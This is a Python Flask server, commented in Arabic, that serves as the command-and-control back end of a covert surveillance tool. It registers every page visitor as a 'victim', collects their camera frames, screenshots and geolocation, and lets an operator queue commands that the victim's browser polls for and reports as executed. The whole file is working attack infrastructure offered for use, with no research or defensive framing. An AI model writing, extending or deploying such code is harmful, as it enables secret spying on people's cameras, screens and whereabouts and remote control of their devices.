from flask import Flask, request, jsonify, render_template
import os
import uuid
import json
from datetime import datetime

app = Flask(__name__)

victims = {}
geo_data = {}
screen_frames = {}
commands = {}  # لتخزين الأوامر المرسلة

# صفحة البداية لتسجيل الضحية تلقائياً
@app.route("/")
def index():
    victim_id = str(uuid.uuid4())
    victims[victim_id] = {}

    victims_file = 'victims.json'
    victims_list = []

    # قراءة الضحايا الحاليين
    if os.path.exists(victims_file):
        with open(victims_file, 'r', encoding='utf-8') as f:
            try:
                victims_list = json.load(f)
            except json.JSONDecodeError:
                victims_list = []

    # إضافة الضحية الجديدة أو تحديثها
    victim_data = {
        "id": victim_id,
        "status": "online",
        "last_seen": datetime.utcnow().isoformat()
    }
    victims_list.append(victim_data)

    # حفظ الضحايا
    with open(victims_file, 'w', encoding='utf-8') as f:
        json.dump(victims_list, f, indent=2, ensure_ascii=False)

    print(f"[REGISTER] Victim {victim_id} registered automatically.")
    return render_template("index.html", victim_id=victim_id)

# استقبال صور الكاميرا
@app.route("/api/camera_frame", methods=["POST"])
def api_camera_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    frame = request.data
    if not os.path.exists("camera"):
        os.makedirs("camera")

    file_path = os.path.join("camera", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    print(f"[CAMERA] Frame saved for Victim {victim_id}")
    return jsonify({"status": "ok"})

# استقبال بيانات الموقع
@app.route("/api/geo", methods=["POST"])
def api_geo():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    data = request.get_json()
    lat = data.get("lat")
    lon = data.get("lon")

    geo_data[victim_id] = {"lat": lat, "lon": lon}
    print(f"[GEO] Victim {victim_id} => Lat: {lat}, Lon: {lon}")

    return jsonify({"status": "ok"})

# استقبال لقطات الشاشة
@app.route("/api/screen_frame", methods=["POST"])
def api_screen_frame():
    victim_id = request.args.get("victim")
    if not victim_id:
        return jsonify({"error": "Victim ID is required"}), 400

    frame = request.data
    if not os.path.exists("screens"):
        os.makedirs("screens")

    file_path = os.path.join("screens", f"{victim_id}.jpg")
    with open(file_path, "wb") as f:
        f.write(frame)

    screen_frames[victim_id] = file_path
    print(f"[SCREEN] Frame saved for Victim {victim_id}")

    return jsonify({"status": "ok"})

# عرض قائمة الضحايا
@app.route('/api/victims', methods=['GET'])
def get_victims():
    victims_file = 'victims.json'
    if os.path.exists(victims_file):
        with open(victims_file, 'r', encoding='utf-8') as f:
            try:
                victims_list = json.load(f)
            except json.JSONDecodeError:
                victims_list = []
    else:
        victims_list = []
    return jsonify(victims_list)

# API لإرسال أوامر
@app.route("/api/execute", methods=["POST"])
def api_execute():
    data = request.get_json()
    vid = data.get("victim_id")
    cmd_code = data.get("command")
    if not vid or not cmd_code:
        return jsonify({"error": "Missing victim_id or command"}), 400
    commands[vid] = cmd_code
    print(f"[COMMAND] For {vid}: {cmd_code}")
    return jsonify({"status": "ok"})

# API لاستقبال الأوامر من الضحية
@app.route("/api/get_command", methods=["GET"])
def api_get_command():
    vid = request.args.get("victim")
    if vid in commands:
        return jsonify({"command": commands[vid]})
    return jsonify({"command": None})

# API لمسح الأمر بعد التنفيذ
@app.route("/api/command_executed", methods=["POST"])
def api_command_executed():
    vid = request.args.get("victim")
    if vid in commands:
        del commands[vid]
    return jsonify({"status": "cleared"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
